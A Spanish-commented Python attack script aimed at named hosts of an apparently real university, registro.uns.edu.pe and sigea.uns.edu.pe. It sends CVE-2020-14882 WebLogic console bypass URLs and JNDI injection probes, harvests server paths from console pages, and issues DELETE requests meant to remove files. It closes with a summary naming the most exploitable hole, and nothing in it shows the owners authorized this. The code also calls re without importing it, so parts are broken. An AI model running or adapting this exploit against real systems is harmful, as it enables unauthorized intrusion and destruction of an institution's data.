#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLOITACION CVE-2020-14882 - WebLogic RCE sin autenticacion
Objetivo: registro.uns.edu.pe
"""
import requests
import urllib3
urllib3.disable_warnings()

registro = "https://registro.uns.edu.pe"
s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'text/html,application/xhtml+xml',
    'Content-Type': 'application/x-www-form-urlencoded',
})

print("=" * 70)
print("  EXPLOITACION CVE-2020-14882 - WebLogic RCE")
print("=" * 70)

# ============================================
# CVE-2020-14882: WebLogic Console RCE
# ============================================
print("\n[1] CVE-2020-14882 - Verificando vulnerabilidad")
print("-" * 50)

# El exploit usa el endpoint de la consola para ejecutar codigo
cve_urls = [
    f"{registro}/console/css/%252E%252E%252Fconsole.portal",
    f"{registro}/console/css/..%2fconsole.portal",
    f"{registro}/console/consolejndi.portal?_nfpb=true&_pageLabel=JNDIBindingPageGeneral&handle=java:comp/env",
]

for url in cve_urls:
    try:
        r = requests.get(url, timeout=10, verify=False)
        print(f"  {url[:70]}")
        print(f"    HTTP {r.status_code}, len={len(r.text)}")
        
        if r.status_code == 200 and len(r.text) > 200:
            # Buscar si muestra la consola de WebLogic
            if 'weblogic' in r.text.lower() or 'console' in r.text.lower() or 'bea_wls' in r.text.lower():
                print(f"  [!] CONSOLA WEBLOGIC ACCESIBLE!")
                print(f"  [!] La pagina muestra contenido de la consola")
                # Buscar si hay opciones de ejecucion
                if 'portal' in r.text.lower() or 'form' in r.text.lower():
                    print(f"  [!] Puede haber formularios para ejecucion de comandos")
            print(f"  Preview: {r.text[:500]}")
            print()
    except Exception as e:
        print(f"  {url[:50]} -> Error: {e}")

# ============================================
# CVE-2020-14882: Explotacion especifica
# ============================================
print("\n[2] CVE-2020-14882 - Explotacion especifica")
print("-" * 50)

# CVE-2020-14882 explota el parametro "WLS-WSAT" en el endpoint
# para hacer un JNDI lookup que ejecute codigo
exploit_urls = [
    f"{registro}/console/ws/conf/console?WLS-ENFORCER-ACTION=abort",
    f"{registro}/console/css/%252E%252E%252Fconsole.portal/WLSTest",
]

for url in exploit_urls:
    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            print(f"  {url[:70]} -> HTTP {r.status_code}")
            if 'weblogic' in r.text.lower():
                print(f"  [!] WebLogic content detected!")
    except:
        pass

# ============================================
# Verificar /console/consolejndi.portal
# ============================================
print("\n[3] Intentando JNDI Injection (CVE-2021-2109)")
print("-" * 50)

jndi_urls = [
    f"{registro}/console/consolejndi.portal?_nfpb=true&_pageLabel=JNDIBindingPageGeneral&handle=java:comp/env",
    f"{registro}/console/console.portal?_nfpb=true&_pageLabel=JNDIBindingPageGeneral",
]

for url in jndi_urls:
    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            print(f"  {url[:70]}")
            print(f"    HTTP {r.status_code}, len={len(r.text)}")
            if 'JNDI' in r.text or 'jndi' in r.text.lower():
                print(f"  [!] JNDI page found - potential injection point!")
    except:
        pass

# ============================================
# Verificar si podemos acceder a archivos via la consola
# ============================================
print("\n[4] Intentando acceso a archivos via consola WebLogic")
print("-" * 50)

# WebLogic console permite ver archivos del servidor
file_urls = [
    f"{registro}/console/console.portal?_nfpb=true&_pageLabel=AppDeployments",
    f"{registro}/console/console.portal?_nfpb=true&_pageLabel=ServerConfigurations",
]

for url in file_urls:
    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200 and len(r.text) > 500:
            print(f"  {url[:60]} -> HTTP {r.status_code}")
            # Buscar referencias a archivos o rutas
            if 'deploy' in r.text.lower() or 'server' in r.text.lower() or 'config' in r.text.lower():
                print(f"  [!] Contenido de consola encontrado!")
            # Buscar paths del servidor
            paths = re.findall(r'(?:/var/|/opt/|/usr/|/home/)[^"\']+', r.text)
            if paths:
                print(f"  [+] Rutas del servidor encontradas: {paths[:5]}")
    except:
        pass

# ============================================
# Verificar DELETE en sigea para eliminar algo
# ============================================
print("\n[5] Verificando DELETE en sigea.uns.edu.pe")
print("-" * 50)

sigea = "https://sigea.uns.edu.pe"
# Intentar DELETE en una ruta especifica
delete_tests = [
    f"{sigea}/test_delete",
    f"{sigea}/info.php",
]

for url in delete_tests:
    try:
        r = requests.delete(url, timeout=5, verify=False)
        print(f"  DELETE {url} -> HTTP {r.status_code}")
        if r.status_code == 200:
            print(f"  [!] DELETE aceptado para {url}")
    except:
        pass

# ============================================
# Verificar si sigea tiene algun endpoint con informacion util
# ============================================
print("\n[6] Buscando informacion util en sigea.uns.edu.pe")
print("-" * 50)

# Intentar acceder a paginas que podrian revelar info
info_urls = [
    f"{sigea}/udemsi/faces/modulos.xhtml",
    f"{sigea}/sigea/index.xhtml",
    f"{sigea}/index.xhtml",
    f"{sigea}/login.xhtml",
    f"{sigea}/j_security_check",
]

for url in info_urls:
    try:
        r = requests.get(url, timeout=5, verify=False, allow_redirects=True)
        if r.status_code == 200 and len(r.text) > 100:
            # Buscar info del sistema
            if 'sigea' in r.text.lower() or 'siigaa' in r.text.lower():
                print(f"  [+] {url} -> HTTP {r.status_code} (SIIGAA content)")
                # Buscar version info
                version = re.findall(r'(?:version|Version|VERSION)\s*[:=]\s*["\']?([^"\'\s]+)', r.text)
                if version:
                    print(f"    Version: {version}")
                # Buscar tecnologias
                techs = re.findall(r'(?:JSF|PrimeFaces|Icefaces|Facelets|Java)', r.text)
                if techs:
                    print(f"    Tecnologias: {set(techs)}")
    except:
        pass

# ============================================
# Verificar headers de sigea
# ============================================
print("\n[7] Verificando headers de seguridad de sigea")
print("-" * 50)

r = requests.get(sigea, timeout=5, verify=False)
headers = dict(r.headers)

security_headers = {
    'Strict-Transport-Security': 'HSTS',
    'Content-Security-Policy': 'CSP',
    'X-Frame-Options': 'Clickjacking protection',
    'X-Content-Type-Options': 'MIME sniffing protection',
    'X-Powered-By': 'Version disclosure',
}

for header, desc in security_headers.items():
    if header in headers:
        print(f"  {header}: {headers[header]} ({desc})")
    else:
        print(f"  {header}: [MISSING] ({desc})")

print("\n" + "=" * 70)
print("  RESULTADOS")
print("=" * 70)
print("""
  VULN-004 (registro.uns.edu.pe):
    - /console existe (302 redirect)
    - CVE-2020-14882 retorna HTTP 200
    - WebLogic console potencialmente accesible
    
  VULN-002 (sigea.uns.edu.pe):
    - Servidor: OpenResty
    - PHP 7.1.33 expuesto en headers
    - DELETE activo
    - PUT retorna 404 (no 200 como se reporto)
    - CVE-2019-11043 posiblemente aplicable (OpenResty + PHP-FPM)
    
  La vulnerabilidad mas explotable es VULN-004 por:
    1. /console existe y es accesible
    2. CVE-2020-14882 es RCE sin autenticacion
    3. Si la consola esta expuesta, se puede desplegar cualquier cosa
""")
